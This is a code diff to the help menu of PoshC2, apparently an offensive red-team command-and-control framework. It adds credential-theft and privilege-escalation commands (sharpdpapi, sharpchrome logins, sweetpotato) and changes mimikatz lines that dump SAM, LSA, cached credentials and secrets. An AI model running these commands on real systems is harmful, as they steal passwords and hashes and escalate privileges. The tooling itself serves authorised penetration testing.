@@ -1,7 +1,7 @@
+import subprocess
 
 from poshc2 import VERSION
 from poshc2.Colours import Colours
-import subprocess
 
 logopic = Colours.GREEN + r"""
                     _________            .__.     _________  ________
@@ -143,6 +143,9 @@ seatbelt PowerShellSettings
 seatbelt RegistryAutoRuns
 watson
 sharpcookiemonster
+sharpdpapi machinetriage
+sharpchrome logins
+sweetpotato -p c:\\users\\public\\startup.exe
 
 Process Dumping:
 ================
@@ -434,10 +437,10 @@ posh_help7 = Colours.GREEN + """
 Credentials / Tokens / Local Hashes (Must be SYSTEM):
 =========================================================
 invoke-mimikatz -command '"sekurlsa::logonpasswords"'
-invoke-mimikatz -command '"lsadump::sam"'
-invoke-mimikatz -command '"lsadump::lsa"'
-invoke-mimikatz -command '"lsadump::cache"'
-invoke-mimikatz -command '"lsadump::secrets"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::sam"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::lsa"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::cache"'
+invoke-mimikatz -command '"privilege::debug" "lsadump::secrets"'
 invoke-mimikatz -command '"ts::multirdp"'
 invoke-mimikatz -command '"privilege::debug"'
 invoke-mimikatz -command '"crypto::capi"'
@@ -590,4 +593,4 @@ SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keyst
                  "sharphound", "rubeus", "sharpview", "kill-process", "watson", "get-hash", "migrate", "sharpsocks", "safetykatz", "get-computerinfo",
                  "get-dodgyprocesses", "sharpweb", "bypass-amsi", "sharpsc", "dcomexec", "smbexec", "wmiexec", "sharpwmi", "sharpcookiemonster", "stop-screenshotmulti",
                  "get-screenshotallwindows", "del", "kill-process", "posh-delete", "getremoteprocesslisting", "getremoteprocesslistingall", "sslinspectioncheck",
-                 "dynamic-code", "startdaisy", "mimikatz", "searchhistory", "stopdaisy", "portscan"]
+                 "dynamic-code", "startdaisy", "mimikatz", "searchhistory", "stopdaisy", "portscan", "sharpdpapi", "sharpchrome", "sweetpotato"]
